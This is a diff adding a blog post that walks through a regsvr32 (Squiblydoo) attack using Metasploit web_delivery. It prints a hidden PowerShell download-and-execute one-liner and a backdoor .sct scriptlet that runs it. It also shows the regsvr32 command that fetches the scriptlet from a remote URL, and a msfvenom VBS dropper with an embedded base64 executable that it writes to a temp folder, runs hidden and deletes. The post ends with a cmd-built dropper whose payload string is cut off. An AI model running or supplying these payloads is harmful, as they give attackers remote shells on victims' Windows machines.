@@ -263,6 +263,133 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/17/Regsrv32-Exploit-With-Metasploit-web-delivery/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/10/17/Regsrv32-Exploit-With-Metasploit-web-delivery/" itemprop="url">
+                  Regsrv32 Exploit With Metasploit web_delivery
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-17T00:40:29+08:00">
+                2016-10-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>###0x01 Metasploit web_delivery<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(gitlab_user_enum) &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; set target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 192.168.0.100</span><br><span class="line">LHOST =&gt; 192.168.0.100</span><br><span class="line">msf exploit(web_delivery) &gt; set LPORT 2333</span><br><span class="line">LPORT =&gt; 2333</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.100:2333</span><br><span class="line">[*] Using URL: http://0.0.0.0:9090/WXCOjGGir</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Local IP: http://192.168.0.100:9090/WXCOjGGir</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring(&apos;http://192.168.0.100:9090/WXCOjGGir&apos;);</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>backdoor.sct</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;registration</span><br><span class="line">    description=&quot;Bandit&quot;</span><br><span class="line">    progid=&quot;Bandit&quot;</span><br><span class="line">    version=&quot;1.00&quot;</span><br><span class="line">    classid=&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">	&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;!-- regsvr32 /s /n /u /i:http://blog.safebuff.com/backdoor.sct scrobj.dll</span><br><span class="line">	&lt;!-- DFIR --&gt;</span><br><span class="line">	&lt;!--		.sct files are downloaded and executed from a path like this --&gt;</span><br><span class="line">	&lt;!-- Though, the name and extension are arbitary.. --&gt;</span><br><span class="line">	&lt;!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct --&gt;</span><br><span class="line">	&lt;!-- Based on current research, no registry keys are written, since call &quot;uninstall&quot; --&gt;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span><br><span class="line">	&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">			var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring(&apos;http://192.168.0.100:9090/WXCOjGGir&apos;);&quot;);</span><br><span class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line"></span><br><span class="line">&lt;public&gt;</span><br><span class="line">    &lt;method name=&quot;Exec&quot;&gt;&lt;/method&gt;</span><br><span class="line">&lt;/public&gt;</span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">	function Exec()</span><br><span class="line">	&#123;</span><br><span class="line">		var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure>
+<p>###0x02 windows run<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt; regsvr32 /s /n /u /i:http://blog.safebuff.com/backdoor.sct scrobj.dll</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x03-Window-cmd-command-line"><a href="#0x03-Window-cmd-command-line" class="headerlink" title="0x03 Window cmd command line"></a>0x03 Window cmd command line</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.204 LPORT=4444 EXITFUNC=thread -f vbs --arch x86 --platform win &gt; test.vbs</span><br><span class="line">&gt; cat test.vbs</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Function sdbyBeauKn(UZpyLbmAYKrH)</span><br><span class="line">	YUwpsWAZxakH = &quot;&lt;B64DECODE xmlns:dt=&quot;&amp; Chr(34) &amp; &quot;urn:schemas-microsoft-com:datatypes&quot; &amp; Chr(34) &amp; &quot; &quot; &amp; _</span><br><span class="line">		&quot;dt:dt=&quot; &amp; Chr(34) &amp; &quot;bin.base64&quot; &amp; Chr(34) &amp; &quot;&gt;&quot; &amp; _</span><br><span class="line">		UZpyLbmAYKrH &amp; &quot;&lt;/B64DECODE&gt;&quot;</span><br><span class="line">	Set UwcHanJT = CreateObject(&quot;MSXML2.DOMDocument.3.0&quot;)</span><br><span class="line">	UwcHanJT.LoadXML(YUwpsWAZxakH)</span><br><span class="line">	sdbyBeauKn = UwcHanJT.selectsinglenode(&quot;B64DECODE&quot;).nodeTypedValue</span><br><span class="line">	set UwcHanJT = nothing</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function GocoGnSZ()</span><br><span class="line">	POTnBArG = &quot;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&quot;</span><br><span class="line">	Dim gXjFxrfBUA</span><br><span class="line">	Set gXjFxrfBUA = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">	Dim MiRpqcNrEnOtoGD</span><br><span class="line">	Dim FzkOXxAmmUZ</span><br><span class="line">	Set MiRpqcNrEnOtoGD = gXjFxrfBUA.GetSpecialFolder(2)</span><br><span class="line">	FzkOXxAmmUZ = MiRpqcNrEnOtoGD &amp; &quot;\&quot; &amp; gXjFxrfBUA.GetTempName()</span><br><span class="line">	gXjFxrfBUA.CreateFolder(FzkOXxAmmUZ)</span><br><span class="line">	exOAGCRIezZZb = FzkOXxAmmUZ &amp; &quot;\&quot; &amp; &quot;wdvgyIHBGGhnHe.exe&quot;</span><br><span class="line">	Dim pDdnPksEFDsWCH</span><br><span class="line">	Set pDdnPksEFDsWCH = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">	olyAwkEzotkp = sdbyBeauKn(POTnBArG)</span><br><span class="line">	Set FZVTocmXtqQxKIi = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">	FZVTocmXtqQxKIi.Type = 1</span><br><span class="line">	FZVTocmXtqQxKIi.Open</span><br><span class="line">	FZVTocmXtqQxKIi.Write olyAwkEzotkp</span><br><span class="line">	FZVTocmXtqQxKIi.SaveToFile exOAGCRIezZZb, 2</span><br><span class="line">	pDdnPksEFDsWCH.run exOAGCRIezZZb, 0, true</span><br><span class="line">	gXjFxrfBUA.DeleteFile(exOAGCRIezZZb)</span><br><span class="line">	gXjFxrfBUA.DeleteFolder(FzkOXxAmmUZ)</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">GocoGnSZ</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt; echo shellcode = WScript.Arguments.Item(0):strXML = ^&quot;^&lt;B64DECODE xmlns:dt=^&quot; ^&amp; Chr(34) ^&amp; ^&quot;urn:schemas-microsoft-com:datatypes^&quot; ^&amp; Chr(34) ^&amp; ^&quot; ^&quot; ^&amp; ^&quot;dt:dt=^&quot; ^&amp; Chr(34) ^&amp; ^&quot;bin.base64^&quot; ^&amp; Chr(34) ^&amp; ^&quot;^&gt;^&quot; ^&amp; shellcode ^&amp; ^&quot;^&lt;^/B64DECODE^&gt;^&quot;:Set oXMLDoc = CreateObject(^&quot;MSXML2.DOMDocument.3.0^&quot;):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode(^&quot;B64DECODE^&quot;).nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject(^&quot;Scripting.FileSystemObject^&quot;):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir ^&amp; ^&quot;\^&quot; ^&amp; fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir ^&amp; ^&quot;\^&quot; ^&amp; ^&quot;test.exe^&quot;:Dim adodbstream:Set adodbstream = CreateObject(^&quot;ADODB.Stream^&quot;):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject(^&quot;Wscript.Shell^&quot;):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir) &gt; %TEMP%\test.vbs</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator&gt; cscript.exe %TEMP%\test.vbs TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAJDZm0gAAAAAAAAAAOAADwMLAQI4AAIAAAAOAAAAAAAAABAAAAAQAAAAIAAAAABAAAAQAAAAAgAABAAAAAEAAAAEAAAAAAAAAABAAAAAAgAARjoAAAIAAAAAACAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAAAwAABkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAAKAAAAAAQAAAAAgAAAAIAAAAAAAAAAAAAAAAAACAAMGAuZGF0YQAAAJAKAAAAIAAAAAwAAAAEAAAAAAAAAAAAAAAAAAAgADDgLmlkYXRhAABkAAAAADAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAwwAAAAAAAAAAAAAAAAAAAAAC4ACBAAP/gkP8lODBAAJCQAAAAAAAAAAD/////AAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANvDvn3pvMHZdCT0WinJZrkEAjFyGgNyGoPqgQtJ8LmkuuN5Nd/8SVGWI1VxKiOlgkutQLNLyQHke5lHCffPc5p12HQrMz67rGgC2i5zVzwOvKo9V6FHbwCt+p8l+8YUde1Oyc4MflxEV6BfiePpR87OoPwkpDLUdEWYGbm04F5+J5eWfNqgbf4AJHVYwp5RWAd4ElbsDnx788P3h3ji1wE6wfNKmGiiNk+UtJgwML81JEniUYlgHKKF82+QCqjnmMN28N/5z24eAjCn5VZg38zW6x/wAoEaZm3+QLoF/YhTiohuA2LbPuTSm+6MOBTRrUL+eketV9PwVPKvYZgoyqIS2Sts06g/mYJSv1ovU9Ve+QRBXdxjzp4L8AhgysFjV1huG5iMbtvOxm6ztrI8prhuUXstkQAo5vmuF8ClUXJSoa4BdwrH+TeqF5O3+n9ol/VPkTJe2BjTLHkd/vEnHg0qMZHxzT5QzRsHJxaYPCeFNUnPENzwkqIKNqogv8dJOMrCFv4mvwdrSWwovpkmJLq7rzK5a/6RNufncZuNPiq1s9dP0iZec6rXfb3aRmGQwXa8kt6WfPHpQ37c5EDBuvNTW2r6xFHom0Oa/2E434GXTkGRgM9PuZPq7xnucgRm/szorE/KkR9kQFJHEyoma8xwiNb6PTlsRB/rIYTN2PAUNsm7VIKq3IK1W/U/rbL6yvth16+qARgMhN546QN0f9Y+m0YBjfVLGNirHAE6sIGuGfmaT279bt6vZMWKsaW47SnHyJy7Qv/BeMD4ECKplmYy/jJtGFE1QimDLK1X3iwpmhOIibD1k/h0Pm0FH9R2ZlBlPMxD79np1dcH4H5LRCUctj94K4OdUbwCaGjSKtuUoTtURmVl6viZXbCwI0mNaDCmpnuqJMmZI6D/krxwfhrSCu4CYoUongz9DPk54XcXqMTS1RzdyiZySOKtcV5eySTzSJXWcEpEMlZ7NdMa